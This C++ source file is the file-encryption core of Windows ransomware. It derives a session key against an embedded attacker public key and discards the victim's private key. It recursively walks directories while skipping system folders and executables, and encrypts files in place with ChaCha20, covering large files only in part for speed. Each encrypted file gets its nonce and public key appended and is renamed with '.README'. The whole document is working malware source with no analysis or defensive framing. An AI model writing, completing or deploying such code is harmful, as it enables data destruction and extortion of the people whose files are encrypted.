#include "encrypt.h"
#include "crypto.h"
#include "iocp_engine.h"
#include <windows.h>
#include <bcrypt.h>

static uint8_t s_session_key[32];
static uint8_t s_victim_pub[32];
static uint8_t s_victim_priv[32];

static const wchar_t* SKIP_EXTENSIONS[] = {
    L".exe", L".dll", L".sys", L".README", nullptr
};

static const wchar_t* SKIP_DIRS[] = {
    L"Windows", L"Program Files", L"$Recycle.Bin", nullptr
};

static constexpr size_t SMALL_FILE  = 1024 * 1024;
static constexpr size_t CHUNK_SIZE  = 512  * 1024;
static constexpr size_t SKIP_RATIO  = 3;

extern uint8_t ATTACKER_PUBLIC[32];

void encryptor_init() {
    generate_keypair(s_victim_pub, s_victim_priv);
    derive_session_key(s_victim_priv, ATTACKER_PUBLIC, s_session_key);
    SecureZeroMemory(s_victim_priv, 32);
}

static bool should_skip_ext(const wchar_t* path) {
    const wchar_t* dot = wcsrchr(path, L'.');
    if (!dot) return false;
    for (int i = 0; SKIP_EXTENSIONS[i]; i++)
        if (_wcsicmp(dot, SKIP_EXTENSIONS[i]) == 0) return true;
    return false;
}

void encrypt_file(const wchar_t* path) {
    if (should_skip_ext(path)) return;

    HANDLE hFile = CreateFileW(path,
        GENERIC_READ | GENERIC_WRITE, 0, NULL,
        OPEN_EXISTING, FILE_FLAG_SEQUENTIAL_SCAN, NULL);
    if (hFile == INVALID_HANDLE_VALUE) return;

    LARGE_INTEGER fs;
    GetFileSizeEx(hFile, &fs);
    size_t file_size = static_cast<size_t>(fs.QuadPart);
    if (file_size == 0) { CloseHandle(hFile); return; }

    HANDLE hMap = CreateFileMappingW(hFile, NULL,
        PAGE_READWRITE, 0, 0, NULL);
    if (!hMap) { CloseHandle(hFile); return; }

    uint8_t* data = reinterpret_cast<uint8_t*>(
        MapViewOfFile(hMap, FILE_MAP_WRITE, 0, 0, 0));
    if (!data) { CloseHandle(hMap); CloseHandle(hFile); return; }

    uint8_t nonce[12] = {};
    BCryptGenRandom(NULL, nonce, 12, BCRYPT_USE_SYSTEM_PREFERRED_RNG);

    if (file_size <= SMALL_FILE) {
        chacha20_encrypt_buffer(data, file_size, s_session_key, nonce);
    } else {
        size_t offset = 0;
        while (offset < file_size) {
            size_t remaining = file_size - offset;
            size_t chunk = (remaining < CHUNK_SIZE) ? remaining : CHUNK_SIZE;
            chacha20_encrypt_buffer(data + offset, chunk, s_session_key, nonce);
            offset += chunk * SKIP_RATIO;
        }
    }

    UnmapViewOfFile(data);
    CloseHandle(hMap);

    SetFilePointer(hFile, 0, NULL, FILE_END);
    DWORD written;
    WriteFile(hFile, nonce, 12, &written, NULL);
    WriteFile(hFile, s_victim_pub, 32, &written, NULL);
    CloseHandle(hFile);

    wchar_t new_path[MAX_PATH];
    wcscpy_s(new_path, path);
    wcscat_s(new_path, L".README");
    MoveFileW(path, new_path);
}

static IOCPEngine* g_engine = nullptr;

void enumerate_and_encrypt(const wchar_t* root) {
    wchar_t pattern[MAX_PATH];
    swprintf_s(pattern, L"%s\\*", root);

    WIN32_FIND_DATAW fd;
    HANDLE hFind = FindFirstFileW(pattern, &fd);
    if (hFind == INVALID_HANDLE_VALUE) return;

    do {
        if (wcscmp(fd.cFileName, L".") == 0 ||
            wcscmp(fd.cFileName, L"..") == 0) continue;

        wchar_t full[MAX_PATH];
        swprintf_s(full, L"%s\\%s", root, fd.cFileName);

        if (fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
            bool skip = false;
            for (int i = 0; SKIP_DIRS[i]; i++)
                if (_wcsicmp(fd.cFileName, SKIP_DIRS[i]) == 0)
                    { skip = true; break; }
            if (!skip) enumerate_and_encrypt(full);
        } else {
            if (g_engine) g_engine->enqueue(full);
        }
    } while (FindNextFileW(hFind, &fd));

    FindClose(hFind);
}
